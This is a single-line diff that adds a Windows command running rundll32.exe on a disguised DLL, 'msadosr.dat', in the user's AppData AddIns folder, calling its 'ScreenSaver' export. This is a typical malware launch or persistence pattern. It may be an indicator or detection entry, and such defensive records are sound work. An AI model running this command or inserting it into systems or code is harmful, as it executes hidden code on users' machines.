@@ -1,0 +1,1 @@
+%SystemRoot%\system32\rundll32.exe "%appdata%\Microsoft\AddIns\msadosr.dat", ScreenSaver
